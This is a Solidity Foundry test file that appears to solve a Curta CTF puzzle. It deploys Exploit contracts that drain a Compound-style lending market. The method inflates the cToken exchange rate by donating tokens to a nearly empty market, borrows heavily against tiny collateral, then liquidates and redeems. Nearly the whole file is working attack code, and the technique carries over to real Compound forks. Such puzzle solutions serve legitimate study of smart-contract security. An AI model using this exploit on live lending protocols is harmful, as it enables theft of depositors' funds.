// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Curta.sol";

contract SolveTest is Test {
    Puzzle public curta;
    Challenge public chall;

    CurtaToken public CUSD;
    CurtaToken public CStUSD;
    CurtaToken public CETH;
    CurtaToken public CWETH;

    CErc20Immutable public CCUSD;
    CErc20Immutable public CCStUSD;
    CErc20Immutable public CCETH;
    CErc20Immutable public CCWETH;

    Comptroller public comptroller;

    function setUp() public {
        curta = new Puzzle();
        curta.deploy();
    }

    function testSolve() public {
        chall = curta.factories(curta.generate(address(this)));

        CUSD = chall.CUSD();
        CStUSD = chall.CStUSD();
        CETH = chall.CETH();
        CWETH = chall.CWETH();

        CCUSD = chall.CCUSD();
        CCStUSD = chall.CCStUSD();
        CCETH = chall.CCETH();
        CCWETH = chall.CCWETH();

        comptroller = chall.comptroller();

        Exploit drainCETH1 = new Exploit(address(CCETH), address(CETH), address(chall), 3500 ether);
        CWETH.transfer(address(drainCETH1), CWETH.balanceOf(address(this)));
        drainCETH1.drain();
        CETH.approve(address(CCETH), type(uint256).max);
        CCETH.liquidateBorrow(address(drainCETH1), 1, CTokenInterface(CCWETH));
        CCWETH.redeem(1);

        Exploit drainCETH2 = new Exploit(address(CCETH), address(CETH), address(chall), 3500 ether);
        CWETH.transfer(address(drainCETH2), CWETH.balanceOf(address(this)));
        drainCETH2.drain();
        CCETH.liquidateBorrow(address(drainCETH2), 1, CTokenInterface(CCWETH));
        CCWETH.redeem(1);

        Exploit drainCETH3 = new Exploit(address(CCETH), address(CETH), address(chall), 3000 ether);
        CWETH.transfer(address(drainCETH3), CWETH.balanceOf(address(this)));
        drainCETH3.drain();
        CCETH.liquidateBorrow(address(drainCETH3), 1, CTokenInterface(CCWETH));
        CCWETH.redeem(1);

        Exploit drainCUSD = new Exploit(address(CCUSD), address(CUSD), address(chall), 10000 ether);
        CWETH.transfer(address(drainCUSD), CWETH.balanceOf(address(this)));
        drainCUSD.drain();
        CUSD.approve(address(CCUSD), type(uint256).max);
        CCUSD.liquidateBorrow(address(drainCUSD), 200, CTokenInterface(CCWETH));
        CCWETH.redeem(1);

        CUSD.transfer(address(uint160(curta.generate(address(this)))), CUSD.balanceOf(address(this)));
        CETH.transfer(address(uint160(curta.generate(address(this)))), CETH.balanceOf(address(this)));
        CWETH.transfer(address(uint160(curta.generate(address(this)))), CWETH.balanceOf(address(this)));

        curta.verify(curta.generate(address(this)), uint256(0));
    }
}

contract Exploit {
    CErc20Immutable target;
    CurtaToken targetUnderlying;
    CurtaToken CWETH;
    CErc20Immutable CCWETH;
    Comptroller comptroller;

    Challenge chall;

    uint256 borrowAmount;

    constructor(address _target, address _targetUnderlyng, address _chall, uint256 _borrowAmount) {
        target = CErc20Immutable(_target);
        targetUnderlying = CurtaToken(_targetUnderlyng);
        chall = Challenge(_chall);

        CWETH = chall.CWETH();
        CCWETH = chall.CCWETH();

        comptroller = chall.comptroller();
        borrowAmount = _borrowAmount;
    }

    function drain() external {
        CWETH.approve(address(CCWETH), type(uint256).max);
        CCWETH.mint(2);

        address[] memory cToken = new address[](1);
        cToken[0] = address(CCWETH);
        comptroller.enterMarkets(cToken);

        CWETH.transfer(address(CCWETH), CWETH.balanceOf(address(this)));
        target.borrow(borrowAmount);
        CCWETH.redeemUnderlying(10000 ether - 1);

        targetUnderlying.transfer(msg.sender, targetUnderlying.balanceOf(address(this)));
        CWETH.transfer(msg.sender, CWETH.balanceOf(address(this)));
    }
}
